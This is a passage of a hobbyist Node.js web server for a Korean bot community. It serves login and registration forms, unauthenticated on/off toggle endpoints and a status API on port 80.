					if(req.method =='GET' && req.url == '/comu') {
						testgo = `<h1>햇봇 커뮤니티 로그인</h1>
					        	<form id="orderForm" action="/comlogin" name="orderForm" class="_orderForm" method="post">
								<br>
								<INPUT TYPE = "TEXT"  NAME = "id" >
								<INPUT TYPE = "PASSWORD"  NAME = "pw" >
								<button class = 'login'>로그인</button></form>
								<a href='/register'><button>회원가입</button></a>`
						res.writeHead(200, {'Content-Type':'text/html', 'charset' : 'utf-8'}); 
						res.end('<meta charset="utf-8">'+String(testgo));

					}
					if(req.method =='GET' && req.url == '/register') {
						testgo = `<h1>햇봇 커뮤니티 회원가입</h1>
					        	<form id="orderForm" action="/new" name="orderForm" class="_orderForm" method="post">
								<br>
								<INPUT TYPE = "TEXT"  NAME = "id" >
								<INPUT TYPE = "PASSWORD"  NAME = "pw" >
								<button class = 'login'>회원가입</button></form>
								`
						res.writeHead(200, {'Content-Type':'text/html', 'charset' : 'utf-8'}); 
						res.end('<meta charset="utf-8">'+String(testgo));

					}
					if(req.method =='GET' && req.url == '/kaoff') {
						ison = 0;
						testgo = {'error' : false, 'message':'카링꺼짐'}
						res.writeHead(200, {'Content-Type':'text/html', 'charset' : 'utf-8'}); 
						res.end('<meta charset="utf-8"><pre style="word-wrap: break-word; white-space: pre-wrap;">'+JSON.stringify(testgo));
						console.log('off') 

					}
					if(req.method =='GET' && req.url == '/kaon') {
						ison = 1;
						testgo = {'error' : false, 'message':'카링켜짐'}
						res.writeHead(200, {'Content-Type':'text/html', 'charset' : 'utf-8'}); 
						res.end('<meta charset="utf-8"><pre style="word-wrap: break-word; white-space: pre-wrap;">'+JSON.stringify(testgo)); 
						console.log('on')
					}

					if(req.method =='GET' && req.url == '/api') { // receive login
						if (ison == 1){
						testgo = {'error' : true, 'message':'올바른 요청이 아니에요 ㅜ'}
						res.writeHead(200, {'Content-Type':'text/html', 'charset' : 'utf-8'}); 
						res.end('<meta charset="utf-8"><pre style="word-wrap: break-word; white-space: pre-wrap;">'+JSON.stringify(testgo));  
						} else {
							testgo = {'error' : false, 'message':'햇봇 카링이 점검중이에요. 나중에 다시 시도 해주세요'}
						res.writeHead(200, {'Content-Type':'text/html', 'charset' : 'utf-8'}); 
						res.end('<meta charset="utf-8"><pre style="word-wrap: break-word; white-space: pre-wrap;">'+JSON.stringify(testgo));  
						}
					}


		})
		


	









server.listen(80, () => {
  console.log('[ 정보 ] 웹 서버가 시작됨.\n');
});


